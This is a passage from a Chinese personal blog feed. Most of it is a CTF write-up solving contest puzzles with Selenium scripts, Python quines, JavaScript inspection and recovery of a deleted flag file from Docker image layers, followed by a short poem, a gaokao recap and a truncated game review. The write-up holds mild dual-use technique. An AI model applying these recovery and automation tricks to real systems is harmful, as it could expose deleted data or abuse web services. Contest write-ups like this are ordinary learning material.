bs.find_element_by_xpath(&quot;/html/body/div/div[3]/div/p&quot;)    if game_over.text == &#39;FLXG 永不放弃！&#39;:        #score = bs.find_element_by_class_name(&#39;score-container&#39;)    #当前得分        #print(&#39;game over, score is %s&#39; % score.text)        #print(&#39;wait 3 seconds, try again&#39;)        #time.sleep(3)        # 游戏结束后，等待3秒，自动点击try again重新开始        print(&quot;重新开始&quot;)        try_again = bs.find_element_by_class_name(&#39;retry-button&#39;)        try_again.click()</code></pre><p>然后丢到后台没理它，开始做下一题了</p><blockquote><p>Two thousand years later…</p></blockquote><p>当我翻到后台——</p><p><img src="https://i.loli.net/2020/11/05/yYrAFqGbuva5PKx.png" alt></p><p>WTF？跑到了 5436 还没结果时我就知道我方法错了</p><p>View-source 走起</p><p><img src="https://i.loli.net/2020/11/05/5DaNYxegl7RjcQP.png" alt><br>诶这不是赤裸裸的提示嘛</p><p>点进去看看<br><img src="https://i.loli.net/2020/11/05/zQgDj395It7FB2A.png" alt><br>看到这里我就知道脚本永远跑不出来了</p><p>再往下翻翻<br><img src="https://i.loli.net/2020/11/05/o6yi9xf5ZcMCSXs.png" alt><br>原来是 js 跳转，那我们直接把<code>url</code>拿出来就行了，可这个<code>url</code>有点奇怪，里面有个函数，拿到控制台跑一下试试</p><p><img src="https://i.loli.net/2020/11/05/sil8qUzjNCvWSGI.png" alt><br>成功获取了真正的<code>url</code>！输入网址回车</p><p>得到第三题的 Flag</p><h3 id="一闪而过的-Flag"><a href="#一闪而过的-Flag" class="headerlink" title="一闪而过的 Flag"></a>一闪而过的 Flag</h3><blockquote><p>flag 来了，可是我什么也看不见！</p></blockquote><p>先下载文件</p><p><img src="https://i.loli.net/2020/11/06/pIFYix1yEhCAjsG.png" alt></p><p>直接双击运行只会看到黑框出现一下就消失了</p><ul><li><p>第一种方法：直接快速截屏，肉眼识别</p></li><li><p>第二种方法：在命令行运行文件</p></li></ul><p>这里采用第二种</p><p><img src="https://i.loli.net/2020/11/06/iu18QkLMeKd23fc.png" alt></p><p>复制</p><p>得到第四题的 Flag</p><h3 id="从零开始的记账工具人"><a href="#从零开始的记账工具人" class="headerlink" title="从零开始的记账工具人"></a>从零开始的记账工具人</h3><blockquote><p>这不是很简单吗？电子表格里面一拖动就算出来了</p></blockquote><p>考察搜索引擎使用以及小脚本的编写</p><p>先把题目下载下来</p><p><img src="https://i.loli.net/2020/11/06/OWnagBTKFYqHN6Z.png" alt></p><p>先看看<code>bills.xlsx</code>，里面是 1000 行人民币大写金额，那么题目要求就是全部转换小写求和了</p><p>这题我一开始就想到了<code>Python</code>，又是我最熟悉的大数据分析，于是直接把<code>bills.xlsx</code>上传到了树莓派的内网<code>notebook</code>服务器上</p><p>首先需要找一个人民币大写转小写的函数做轮子，再用数量乘金额并求和</p><p>代码如下</p><pre><code>import numpy as npimport pandas as pdimport redef aoligeiganle(amount):    chinese_num = {&#39;零&#39;: 0, &#39;壹&#39;: 1, &#39;贰&#39;: 2, &#39;叁&#39;: 3, &#39;肆&#39;: 4, &#39;伍&#39;: 5, &#39;陆&#39;: 6, &#39;柒&#39;: 7, &#39;捌&#39;: 8, &#39;玖&#39;: 9}    chinese_amount = {&#39;分&#39;: 0.01, &#39;角&#39;: 0.1, &#39;元&#39;: 1, &#39;拾&#39;: 10, &#39;佰&#39;: 100, &#39;仟&#39;: 1000, &#39;圆&#39;: 1}    amount_float = 0    if &#39;亿&#39; in amount:        yi = re.match(r&#39;(.+)亿.*&#39;, amount).group(1)        amount_yi = 0        for i in chinese_amount:            if i in yi:                amount_yi += chinese_num[yi[yi.index(i) - 1]] * chinese_amount[i]        if yi[-1] in chinese_num.keys():            amount_yi += chinese_num[yi[-1]]        amount_float += amount_yi * 100000000        amount = re.sub(r&#39;.+亿&#39;, &#39;&#39;, amount, count=1)    if &#39;万&#39; in amount:        wan = re.match(r&#39;(.+)万.*&#39;, amount).group(1)        amount_wan = 0        for i in chinese_amount:            if i in wan:                amount_wan += chinese_num[wan[wan.index(i) - 1]] * chinese_amount[i]        if wan[-1] in chinese_num.keys():            amount_wan += chinese_num[wan[-1]]        amount_float += amount_wan * 10000        amount = re.sub(r&#39;.+万&#39;, &#39;&#39;, amount, count=1)    amount_yuan = 0    for i in chinese_amount:        if i in amount:            if amount[amount.index(i) - 1] in chinese_num.keys():                amount_yuan += chinese_num[amount[amount.index(i) - 1]] * chinese_amount[i]    amount_float += amount_yuan    return amount_floatdf = pd.read_excel(&#39;./bills.xlsx&#39;, &#39;Sheet1&#39;)raw_price_list = []price_list = []num_list = np.array(df[&#39;数量&#39;])for i in range(0,1000):    raw_price_list.append(aoligeiganle(df[&#39;单价&#39;][i]))raw_price_list = np.array(raw_price_list)sum(np.multiply(num_list, raw_price_list))</code></pre><p>这里其实麻烦也挺多的，很后面才发现找来的这个函数不完整，没有对<code>拾</code>开头汉字金额的进行处理</p><p><img src="https://i.loli.net/2020/11/06/S4duyZ5mxzRWa2P.png" alt></p><p>于是在函数尾部加上以下代码</p><pre><code>if &#39;拾&#39; in amount[0]:        amount_float += 10</code></pre><p>最终运算结果是这样的</p><p><img src="https://i.loli.net/2020/11/06/DZtu5snPmXKgJ2Y.png" alt></p><p>答案<code>12422.75</code>，这就是第五题的 Flag 值了</p><p>得到第五题 Flag</p><h3 id="自复读的复读机"><a href="#自复读的复读机" class="headerlink" title="自复读的复读机"></a>自复读的复读机</h3><blockquote><p>能够复读其他程序输出的程序只是普通的复读机。<br>顶尖的复读机还应该能复读出自己的源代码。<br>什么是国际复读机啊（战术后仰）</p></blockquote><p>这题应该是我耗时最长的题目了，不过题目本身还是非常有意思的</p><p>先来读题</p><blockquote><p>你现在需要编写两个只有一行 Python 代码的顶尖复读机：<br>满足两个条件分别对应了两个 flag</p><ul><li>其中一个要输出代码本身的逆序（即所有字符从后向前依次输出）</li><li>另一个是输出代码本身的 sha256 哈希值，十六进制小写</li></ul></blockquote><p>遇事不懂，首先谷歌</p><p>Quine 是什么？</p><blockquote><p>A quine is a computer program which takes no input and produces a copy of its own source code as its only output. The standard terms for these programs in the computability theory and computer science literature are “self-replicating programs”, “self-reproducing programs”, and “self-copying programs”.<br>—-Wiki</p></blockquote><p>简而言之就是打印出代码本身</p><p>看来 Quine 就是我们所需要的了</p><p>找到以下文章供参考</p><p><a href="http://littledva.cn/article-24/" rel="noopener" target="_blank">http://littledva.cn/article-24/</a></p><p>还是打开我最熟悉的<code>notebook</code>，一步步来解析题目吧！</p><pre><code>a=chr(39);c=&quot;+a)*2+c)&quot;;print((&#39;a=chr(39);c=&quot;+a)*2+c)&quot;;print((&#39;+a)*2+c)</code></pre><p>先把范例拿进去试试，的确输出了代码本身</p><p>然后解析一下这段代码的原理</p><ul><li>代码只有一个<code>print</code>函数</li><li>代码可以拆成以下三部分<ol><li>a=chr(39);c=”+a)*2+c)”;print((‘</li><li>a=chr(39);c=”+a)*2+c)”;print((‘</li><li>+a)*2+c)</li></ol></li><li><code>print</code>的层级<ol><li>‘a=chr(39);c=”+a)*2+c)”;print((‘</li><li>(‘1’+a)*2</li><li>(‘1’+a)*2+c</li></ol></li></ul><p>仔细看看就可以明白代码自复读的原理了</p><h4 id="以上不详细讲了，进入解题吧"><a href="#以上不详细讲了，进入解题吧" class="headerlink" title="以上不详细讲了，进入解题吧"></a>以上不详细讲了，进入解题吧</h4><blockquote><p>第一题：输出代码本身的逆序（即所有字符从后向前依次输出）</p></blockquote><p>我们知道<code>Python</code>字符串逆序有以下两种方法（其余不介绍）：</p><ul><li>str[::-1]</li><li>‘’.join(reversed(str))</li></ul><p>显然第一个看起来简单好写，从第一个入手</p><pre><code>a=chr(39);c=&quot;+a)*2+c)&quot;;print((&#39;a=chr(39);c=&quot;+a)*2+c)&quot;;print((&#39;+a)*2+c)</code></pre><p>我们要输出逆序，那就直接在<code>print</code>最后加个<code>[::-1]</code>试试呗</p><pre><code>a=chr(39);c=&quot;+a)*2+c)&quot;;print(((&#39;a=chr(39);c=&quot;+a)*2+c)&quot;;print((&#39;+a)*2+c)[::-1])# 输出 )c+2*)a+&#39;((tnirp;&quot;)c+2*)a+&quot;=c;)93(rhc=a&#39;((tnirp;&quot;)c+2*)a+&quot;=c;)93(rhc=a# 正序 a=chr(39);c=&quot;+a)*2+c)&quot;;print((&#39;a=chr(39);c=&quot;+a)*2+c)&quot;;print((&#39;+a)*2+c)</code></pre><p>少了<code>[::-1]</code>和一对括号，那就加到<code>c</code>里面去</p><pre><code>a=chr(39);c=&quot;+a)*2+c)[::-1])&quot;;print(((&#39;a=chr(39);c=&quot;+a)*2+c)[::-1])&quot;;print(((&#39;+a)*2+c)[::-1])# 输出 )]1-::[)c+2*)a+&#39;(((tnirp;&quot;)]1-::[)c+2*)a+&quot;=c;)93(rhc=a&#39;(((tnirp;&quot;)]1-::[)c+2*)a+&quot;=c;)93(rhc=a# 正序 a=chr(39);c=&quot;+a)*2+c)[::-1])&quot;;print(((&#39;a=chr(39);c=&quot;+a)*2+c)[::-1])&quot;;print(((&#39;+a)*2+c)[::-1])</code></pre><p>完成！它输出了自身的倒序！</p><p>可这还不够，我们把它丢到<code>web executor</code>试试</p><pre><code>Your code is:&#39;a=chr(39);c=&quot;+a)*2+c)[::-1])&quot;;print(((\&#39;a=chr(39);c=&quot;+a)*2+c)[::-1])&quot;;print(((\&#39;+a)*2+c)[::-1])&#39;Output of your code is:&#39;)]1-::[)c+2*)a+\&#39;(((tnirp;&quot;)]1-::[)c+2*)a+&quot;=c;)93(rhc=a\&#39;(((tnirp;&quot;)]1-::[)c+2*)a+&quot;=c;)93(rhc=a\n&#39;</code></pre><p>它发生了什么？多了个<code>\n</code>！</p><p>其实我看到这里犯了个迷糊，既然你输出<code>\n</code>那我也输出一个<code>\n</code>不就是了吗（大声）<del>不</del></p><p>然后有了以下代码</p><pre><code>a=chr(39);b=chr(92)+&quot;n&quot;;c=&quot;+a)*2+c)[::-1]+b)&quot;;print(((&#39;a=chr(39);b=chr(92)+&quot;n&quot;;c=&quot;+a)*2+c)[::-1]+b)&quot;;print(((&#39;+a)*2+c)[::-1]+b)</code></pre><p>然后…</p><pre><code>Your code is:&#39;a=chr(39);b=chr(92)+&quot;n&quot;;c=&quot;+a)*2+c)[::-1]+b)&quot;;print(((\&#39;a=chr(39);b=chr(92)+&quot;n&quot;;c=&quot;+a)*2+c)[::-1]+b)&quot;;print(((\&#39;+a)*2+c)[::-1]+b)&#39;Output of your code is:&#39;)b+]1-::[)c+2*)a+\&#39;(((tnirp;&quot;)b+]1-::[)c+2*)a+&quot;=c;&quot;n&quot;+)29(rhc=b;)93(rhc=a\&#39;(((tnirp;&quot;)b+]1-::[)c+2*)a+&quot;=c;&quot;n&quot;+)29(rhc=b;)93(rhc=a\\n\n&#39;</code></pre><p>我就忍不住笑了 hhh</p><p>后来我才想到是<code>print</code>自带的换行啊，那我加个<code>end=&#39;&#39;</code>不就行了吗</p><p>于是正确代码如下——</p><pre><code>a=chr(39);c=&quot;+a)*2+c)[::-1],end=&quot;+a*2+&quot;)&quot;;print(((&#39;a=chr(39);c=&quot;+a)*2+c)[::-1],end=&quot;+a*2+&quot;)&quot;;print(((&#39;+a)*2+c)[::-1],end=&#39;&#39;)</code></pre><p><img src="https://i.loli.net/2020/11/06/5YKdA9vHisSmODh.png" alt></p><p>得到此题第一个 Flag</p><blockquote><p>第二题：输出代码本身的 sha256 哈希值，十六进制小写</p></blockquote><p>此题难度高一点</p><p>先贴出源代码</p><pre><code>import hashlib;a=chr(39);c=&quot;+a)*2+c+a+&quot;;d=a+&quot;+d).encode()).hexdigest(),end=&quot;+a*2+&quot;)&quot;;print(hashlib.sha256(((&#39;import hashlib;a=chr(39);c=&quot;+a)*2+c+a+&quot;;d=a+&quot;+d).encode()).hexdigest(),end=&quot;+a*2+&quot;)&quot;;print(hashlib.sha256(((&#39;+a)*2+c+a+&#39;.encode()).hexdigest())&#39;+d).encode()).hexdigest(),end=&#39;&#39;)</code></pre><p>就随便讲讲思路吧，前面其实挺好构造的，主要是后面那一块</p><p>这个构造就是靠眼力，哪里多了个单引号，哪里少了个括号，添添补补就完事了。</p><p>构造<code>d</code>的原理和构造<code>c</code>的原理是一样的</p><p>构造原型是这样的——</p><pre><code>import hashlib;print(hashlib.sha256(&quot;codeself&quot;.encode()).hexdigest())</code></pre><p><code>codeself</code>就是输出这个代码本身了</p><p>在进行构造时，可以把<code>codeself</code>写成如下形式方便参考</p><pre><code>a=chr(39)c=&quot;+a)*2+c+a+&quot;d=a+&quot;+d).encode()).hexdigest(),end=&quot;+a*2+&quot;)&quot;;print((&#39;import hashlib;a=chr(39);c=&quot;+a)*2+c+a+&quot;;d=a+&quot;+d).encode()).hexdigest(),end=&quot;+a*2+&quot;)&quot;;print(hashlib.sha256(((&#39;+a)*2+c+a+&#39;.encode()).hexdigest())&#39;+d,end=&#39;&#39;)</code></pre><p>一般来说，只要这里输出和你的源代码一样，那这个题目就完成了</p><p>然后放到<code>web executor</code></p><p><img src="https://i.loli.net/2020/11/06/nulRX6h31i98Hsx.png" alt></p><p>得到此题第二个 Flag</p><h4 id="小小的题外话"><a href="#小小的题外话" class="headerlink" title="小小的题外话"></a>小小的题外话</h4><p>当时做这题时周末已经结束了，于是我用思修课加一节晚自习，靠手写把这两题硬生生写出来的，用了整整四张草稿纸。<br><img src="https://i.loli.net/2020/11/06/dclWbRTk6yEOXPa.jpg" alt></p><h3 id="233-同学的-Docker"><a href="#233-同学的-Docker" class="headerlink" title="233 同学的 Docker"></a>233 同学的 Docker</h3><blockquote><p>既然已经删掉了，应该不会被人找出来吧？</p></blockquote><p>我本人并未使用过<code>Docker</code>，因此解这题并没有用到什么特别高级的技巧或者命令</p><p>先把镜像拉下来</p><pre><code>sudo docker pull 8b8d3c8324c7/stringtool</code></pre><p>查看一下修改历史</p><pre><code>sudo docker history 8b8d3c8324c7/stringtool</code></pre><p><img src="https://i.loli.net/2020/11/06/LCGN6Dmo57wahKZ.png" alt></p><p>第二行这个<code>flag.txt</code>明显就是我们需要的了</p><p>进入<code>docker</code>主目录</p><pre><code>cd /var/lib/docker</code></pre><p>直接搜索<code>flag.txt</code></p><pre><code>sudo find . | grep flag.txt</code></pre><p><img src="https://i.loli.net/2020/11/06/geqpa78cIlAN3Vr.png" alt></p><p>出现了两个结果，分别<code>cat</code>一下看看</p><pre><code>sudo cat ./overlay2/a81374850a078b714197906a329e0250980bb2d44506c274e367c1e65e0af83d/diff/code/flag.txtsudo cat ./overlay2/1595e998716bd50a416f17e04ac40a819e138974da1463cab6428319794c42e8/diff/code/flag.txt</code></pre><p><img src="https://i.loli.net/2020/11/06/9SZWPEXBHVRFCGL.png" alt></p><p>在第二个文件中发现了我们需要的 Flag</p><h3 id="其它的"><a href="#其它的" class="headerlink" title="其它的"></a>其它的</h3><h3 id="狗狗银行"><a href="#狗狗银行" class="headerlink" title="狗狗银行"></a>狗狗银行</h3><blockquote><p>你能在狗狗银行成功薅到羊毛吗？</p></blockquote><p>先说明这题我并没能解出来，后来才听我朋友说要用<code>burp</code></p><blockquote><p>不对，没解出来能算进<code>Write-up</code>的一部分嘛，于是我就写了个<code>其它的</code></p></blockquote><p>进去网页看看</p><p><img src="https://i.loli.net/2020/11/06/z6N93RicFg8Q7TS.png" alt></p><p>一开始会给你初始资产<code>1000</code>，把它薅到<code>2000</code>就是胜利了</p><ul><li>收入来源：<code>储蓄卡利息</code></li><li>支出方向：<code>吃饭</code>、<code>还款利息</code></li></ul><p>研究一下利息可以发现，它在<code>1000</code>时每日利息为<code>3</code>，可在<code>167</code>时每日利息为<code>1</code>，那我分出把<code>1000</code>分成六张<code>167</code>的卡试试，结果发现利息涨为每日<code>6</code>了，于是我的基本思路就是<code>借款吃饭，用储蓄卡利息叠钱叠利息</code></p><p>手动有点麻烦，写个<code>selenium</code>自动脚本试试</p><pre><code>from selenium import webdriverfrom selenium.webdriver.common.keys import Keysfrom selenium.common.exceptions import NoSuchElementException, StaleElementReferenceException, ElementClickInterceptedException, UnexpectedAlertPresentExceptionimport timeimport requestsimport json# 打开狗狗银行bs = webdriver.Firefox()bs.get(&quot;http://202.38.93.111:10100/?token=1294%3AMEYCIQDGGgsw4ZIS8VYoonINuZNHwWagU8HonbAS8xibpRsb8QIhAMtC8zWSEbqwPOgmgaix0hzT%2Bho30JdIC8fp%2B1Uojwdg&quot;)time.sleep(3)html = bs.find_element_by_tag_name(&#39;html&#39;)# 添加 600 个储蓄卡，33 为对应办新卡的数字+1# bs.find_element_by_xpath(&quot;/html/body/div/section/main/section/aside/div/div[184]&quot;).click()# time.sleep(1)# for i in range(600):#     bs.find_element_by_class_name(&quot;ant-card-extra&quot;).click()#     time.sleep(0.8)def transfer(hunter, target):    bs.find_element_by_xpath(&quot;/html/body/div/section/main/section/main/div[1]/div/div/div[1]/div[2]/button&quot;).click() # 点击转账按钮    time.sleep(0.2)    bs.find_element_by_xpath(&quot;/html/body/div[2]/div/div[2]/div/div[2]/div[2]/form/div[1]/div[2]&quot;).click() # 点击第一个框    # bs.find_element_by_xpath(&quot;/html/body/div[3]/div/div/div/div[2]/div/div/div[&quot; + hunter + &quot;]&quot;).click() # 选择 hunter，数字代表对应储蓄卡    time.sleep(0.5)    ele_first = bs.find_element_by_xpath(&quot;/html/body/div[3]/div/div/div/div[2]&quot;)    if int(hunter) == 1:        ele_first.send_keys(Keys.ENTER)    else:        for i in range(int(hunter) - 1):            ele_first.send_keys(Keys.DOWN)            time.sleep(0.2)        time.sleep(0.4)        ele_first.send_keys(Keys.ENTER)    bs.find_element_by_xpath(&quot;/html/body/div[2]/div/div[2]/div/div[2]/div[2]/form/div[2]/div[2]&quot;).click() # 点击第二个框    # bs.find_element_by_xpath(&quot;/html/body/div[4]/div/div/div/div[2]/div/div/div[&quot; + target + &quot;]&quot;).click() # 选择 target，数字代表对应储蓄卡    time.sleep(0.5)    ele_second = bs.find_element_by_xpath(&quot;/html/body/div[4]/div/div/div/div[2]&quot;)    if int(target) == 1:        ele_second.send_keys(Keys.ENTER)    else:        for i in range(int(target) - 1):            ele_second.send_keys(Keys.DOWN)            time.sleep(0.2)        time.sleep(0.4)        ele_second.send_keys(Keys.ENTER)    bs.find_element_by_xpath(&quot;/html/body/div[2]/div/div[2]/div/div[2]/div[2]/form/div[3]/div[2]/div/div/div/div[2]/input&quot;).send_keys(5) # 输入金额，目前固定 5 元    bs.find_element_by_xpath(&quot;/html/body/div[2]/div/div[2]/div/div[2]/div[3]/button[2]&quot;).click() # convert# 基本设计方法，每次信用卡借款5次，从大于167余额的储蓄卡转相应数额到不足的卡# 信用卡借款 5 次def rent_money():    bs.find_element_by_xpath(&quot;/html/body/div/section/main/section/aside/div/div[8]&quot;).click()    time.sleep(1)    for times in range(2):        bs.find_element_by_xpath(&quot;/html/body/div/section/main/section/main/div[2]/div/form/button&quot;).click()        time.sleep(1)# 获取所有卡的余额,余额为 172 或者大于 172 的卡转给不足 167 的卡，根据差分倍数进行多次转账while True:    # 借款模块    try:        bs.find_element_by_xpath(&quot;/html/body/div/section/main/section/aside/div/div[8]&quot;).click()        time.sleep(1)        for times in range(5):            print(&quot;借款 1 次&quot;)            bs.find_element_by_xpath(&quot;/html/body/div/section/main/section/main/div[2]/div/form/button&quot;).click()            time.sleep(1)    except NoSuchElementException:        print(&quot;无此元素报错，可能是页面未刷新完全，继续下一个动作&quot;)        bs.refresh()    # 转账模块    try:        banl_list = []        for i in range(1, 200): # 减小内存占用，请在此设置操作的储蓄卡区间，需要大于下面设置的值            banl = bs.find_element_by_xpath(&quot;/html/body/div/section/main/section/aside/div/div[&quot; + str(i+1) + &quot;]/div[2]/div/span[2]&quot;).text            banl_list.append(str(banl))        insuff = [j + 1 for j in range(len(banl_list)) if int(banl_list[j]) &lt; 167][0:4]        for b in range(100): # 减小内存占用，请在此设置操作的储蓄卡区间            insuff_Card_list = []            if b == 6:                continue            elif int(banl_list[b]) &gt;= 172:                try:                    print(&quot;储蓄卡 &quot; + str(b+1) + &quot; 余额为 &quot; + banl_list[b])                    print(&quot;储蓄卡 &quot; + str(b+1) + &quot; 转给储蓄卡 &quot; + str(insuff[0]))                    transfer(str(b + 1), str(insuff[2]))                    time.sleep(1)                    if abs(167 - int(banl_list[b])) / 5 &gt;= 2:                        print(&quot;储蓄卡 &quot; + str(b+1) + &quot; 转给储蓄卡 &quot; + str(insuff[1]) + &quot; 第二次&quot;)                        transfer(str(b + 1), str(insuff[0]))                        time.sleep(1)                        if abs(167 - int(banl_list[b])) / 5 &gt;= 3:                            print(&quot;储蓄卡 &quot; + str(b+1) + &quot; 转给储蓄卡 &quot; + str(insuff[2]) + &quot; 第三次&quot;)                            transfer(str(b + 1), str(insuff[1]))                            time.sleep(1)                            if abs(167 - int(banl_list[b])) / 5 &gt;= 4:                                print(&quot;储蓄卡 &quot; + str(b+1) + &quot; 转给储蓄卡 &quot; + str(insuff[2]) + &quot; 第三次&quot;)                                transfer(str(b + 1), str(insuff[0]))                                time.sleep(1)                except NoSuchElementException:                    print(&quot;无此元素报错，可能是页面未刷新完全，继续下一个动作&quot;)                    continue                except StaleElementReferenceException:                    print(&quot;选择元素报错，原因未知，刷新页面，继续下一个动作&quot;)                    bs.refresh()                    time.sleep(2)                except ElementClickInterceptedException:                    print(&quot;表单选择错误，可能是识别混乱，刷新页面，继续下一个动作&quot;)                    bs.refresh()                    time.sleep(2)            elif int(banl_list[b]) &lt; 172:                if int(banl_list[b]) == 0:                    insuff_Card_list.append(b + 1)                else:                    print(banl_list[b])                    print(&quot;储蓄卡 &quot; + str(b + 1) + &quot; 不足172元，跳过&quot;)                    continue        if len(insuff_Card_list) &gt; 4:            print(&quot;储蓄卡 &quot; + &quot;&quot;.join(insuff_Card_list) + &quot; 空空如也&quot;)    except UnexpectedAlertPresentException:        print(&quot;未知错误，刷新&quot;)        bs.refresh()        time.sleep(2)</code></pre><p>首先设置了一个转账函数<code>transfer()</code>，把固定金额从一个卡转到另一个卡</p><p>其次是生成储蓄卡，用于自动生成<code>600</code>张储蓄卡</p><p>再是借款模块，在每次循环开始借款<code>5</code>次</p><p>再写一个转账模块，包括识别和函数</p><p>再把报错处理一下，全部模块丢进<code>while True</code></p><blockquote><p>以上仅为测试用，所以并没有写的很深入，比如固定金额转账，还有一些报错处理没完善<br>当时我是比赛第一天熬夜写的脚本，花了<code>4</code>个钟</p></blockquote><p>第二天就丢在后台运行了一个下午，后来就变成上面图片那样，负资产越来越多直到<code>-5000</code></p><p>然后我就不想去碰这题了（题目真屑————啊不对，我真屑</p><p>至于用<code>burp</code>解题，我不会啊啊啊（（</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote><p>当前分数：900， 总排名：379 / 2340<br>binary：0 ， general：750 ， math：0 ， web：150<br>（非准确数值）</p></blockquote><p>估计再过一天也做不出来什么题目</p><p>排行榜看看，发现苏卡卡已经<code>3100</code>分了</p><p><img src="https://i.loli.net/2020/11/06/kPH9vUGtiYsJM1T.png" alt></p><p>对比赛总结一下就是</p><ul><li><code>web</code>相关的难一点点的话一个解不出来，思路倒是有挺多，主要是工具不会用（</li><li>能真正用到<code>selenium</code>的地方确实不多，<del>以后还是不费这么大劲去写它了</del></li><li>能做出来的题目做得还是非常愉快的，也确实<code>老少皆宜</code></li><li>（果然我就是菜鸡）</li></ul><p>明年预计是要继续打的</p><p>就算是提前放出<code>Write-up</code>，只要我的分数够低也是没有问题的（逃</p><blockquote><p>注意：博文图片可能需要翻墙访问，虽说之前说过要翻新博客，可也一直咕着，虽有基本的框架，但并不想那么早放出来，以前就被人爆破过。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
          <category> 代码 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>无题</title>
      <link href="archives/wu-ti.html"/>
      <url>archives/wu-ti.html</url>
      
        <content type="html"><![CDATA[<p>No Title</p><a id="more"></a><p>「并非是因为普通或者特殊，只是这样的日常对我而言，也必有其存在的价值」</p><p>对我而言，没有那样特殊重要的理由</p><p>无论是某个人，还是某份感情</p><p>因为你是外人，而不是圣诞老人</p><p>你那伪劣的胡子以及不红的脸都在令我表示怀疑</p><p>我让你离开我的胸口，你却在我怀里乱窜</p><p>“别动好吗”</p><p>为什么你总是在骗我</p><p>明明知道我也在骗着你</p><p>难道你是黑蜥蜴星人么</p><p>还是波罗罗星人</p><p>你向我传达炒面真好吃的时候我是不是应该推荐你进入棒球社比较好呢</p><p>你所认为的善，究竟是爱，还是恶劣呢</p><p>我忘却了思考</p><p>当然这是我假装的</p><p>我转而去问哲学家某些形而上的问题</p><p>我转而去找禅师寻求超凡脱俗的道路</p><p>最终答案却是与你度过的日常</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>高考简报</title>
      <link href="archives/gao-kao-jian-bao.html"/>
      <url>archives/gao-kao-jian-bao.html</url>
      
        <content type="html"><![CDATA[<p>全国一卷 对今年的高考作一个小评估</p><a id="more"></a><p>直入正题吧！</p><h2 id="语文"><a href="#语文" class="headerlink" title="语文"></a>语文</h2><blockquote><p>难度较高</p></blockquote><ul><li>小说、古诗、作文都难</li></ul><p>选择题发挥正常是错三个。小说是难懂的 “八分之一” 文学。<br>作文感觉有点跑题了。作文题是典故-发言稿。<br>平时语文就不是很高，个人发挥也不是很好，整体估分在 85-100 间。</p><h2 id="英语"><a href="#英语" class="headerlink" title="英语"></a>英语</h2><blockquote><p>难度正常 听说考试同样难度正常</p></blockquote><ul><li>C、D 篇较难，其他都不是很难</li></ul><p>阅读和完形容错 4-7 个，短文填空和改错都没什么好提的容错1-2个。<br>作文并不是应用文，这也在预料范围内。<br>大概和 18 年的难度差不多，18 年卷子基础分拿了 83，这次总分大概也在 120-130 之间。</p><h2 id="数学"><a href="#数学" class="headerlink" title="数学"></a>数学</h2><blockquote><p>简单！客观而言也比往年卷简单</p></blockquote><ul><li>第三题那著名的金字塔就算不是高考生也有所耳闻了吧ww</li><li>11 题应该属于硬解型圆锥曲线，思路倒是有但也是没时间算</li><li>17 题考的数列也属于简单题没什么难度</li><li>18-空间向量<br>虽然平时被我归入简单题，但这次的题算的怪怪的，最后结果没能出来，然后我周围有很多人都是差不多</li><li>19-概率与统计<br>就是个 D…… 啊不对，是亲爹！</li><li>20-圆锥曲线<br>求定点 弟弟题！思路就是找出 kAP 与 kDP 的关系，我记得是 3 倍关系，然后用斜率和已知点设直线，用根与系数的关系求出 C、D 点坐标，求出 CD 直线方程，再就可以直接求出定点了</li><li>21-导数<br>第一问简单地二次求导就可以解决，第二问没看</li><li>选做-极坐标与参数方程<br>第一问送分，第二问拉分题没做出来</li></ul><p>选填三十分钟做完，容错两个。<br>参数方程和极坐标第二问有点奇怪，超出平时做题范围，不会但坐标大概是 (1/4, 1/4)<br>估分在 110 左右。</p><h2 id="理综"><a href="#理综" class="headerlink" title="理综"></a>理综</h2><blockquote><p>难度正常</p></blockquote><ul><li><p>选择题都很简单</p></li><li><p>物理：<br>实验题稍微难算但都可以解出<br>24、25 一二问都比较简单可以写出，24题第二问有点难算没算出来<br>热力学简单，第一问是填空形式</p></li><li><p>化学：<br>第一道大题简单<br>有机总体而言简单，同分异构个数较难，合成未知</p></li><li><p>生物：<br>没考实验题<br>3-3 考了个骨髓瘤细胞制备</p></li></ul><p>照往常惯例化学总是留到最后且写不完，这次也是留了两道的大题，稍微有点后悔把时间花在了生物上，估分在 180 附近吧</p>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>浅谈纸上魔法使</title>
      <link href="archives/qian-tan-zhi-shang-mo-fa-shi.html"/>
      <url>archives/qian-tan-zhi-shang-mo-fa-shi.html</url>
      
        <content type="html"><![CDATA[<p>涉及「纸上魔法使」「青空下的加缪」，无分析，仅浅谈，微剧透慎入</p><a id="more"></a><h2 id="纸上魔法使"><a href="#纸上魔法使" class="headerlink" title="纸上魔法使"></a>纸上魔法使</h2><p>原名：紙の上の魔法使い<br>类型：视觉小说<br>开发商：ウグイスカグラ<br>剧本：ルクル<br>原画：桐叶<br>主线时长：25-30 h<br>全线时长：30 h +<br>主要人物：月社琉璃、游行寺夜子、日向彼方、月社妃、伏见理央、游行寺汀、游行寺暗子、本城奏、本城岬、克利索贝利露</p><p>我是在去年下半年玩到这部游戏的，游戏不算小众也谈不上高人气，了解到它是因为当时刚玩完色鸟鸟颇有点感触，然后在不知在逛花火还是哪里的时候看到有人推了这部游戏。不得不说剧情有点长，并且当时还有别的Galgame 想推，在去年推了三章后就把后面的剧情拖到了最近来玩。</p><p>玩通主线后的我可谓是百感交集又觉着五味杂陈。游戏并未全通，考虑到分支大多是 H-scene，没兴趣便没急着去玩。考试后会二通此游戏，这也是这篇博文冠名为浅谈的理由。二通后会出深谈吗？我也不知道。写下这篇浅谈很大的动机是这部游戏出色的人物塑造，以及我在今年三月多玩到的一部哲学电波系作品，还有就是为了更好地二刷。最近精神谈不上健康，文章可能有点我无法察觉的混乱。</p><p>那么接下来请进入纸上世界——</p><h3 id="游行寺夜子"><a href="#游行寺夜子" class="headerlink" title="游行寺夜子"></a>游行寺夜子</h3><blockquote><p>身份：图书管理员</p></blockquote><p>「白发赤瞳的诅咒之身，受人冷眼」</p><p>夜子之为悲剧故事的主角，她为了选择孤身的不幸、为了期盼谁都不会受伤的世界而欺骗自己渴望幸福的愿望。</p><p>闭门不出的尼特少女为了隐藏内心深处的愿望无意间成为了加害者，发现这一事实的她选择了自我伤害而不是做出改变，选择了无人的鸟笼而不是虚伪的人偶剧场，这是一个令我有些致郁又略微感动的点。不像其他角色正面塑造多，夜子基本就是一个感情脆弱的人物，虽然她在后期做出了自己可以接受的改变，但总感不足。</p><h3 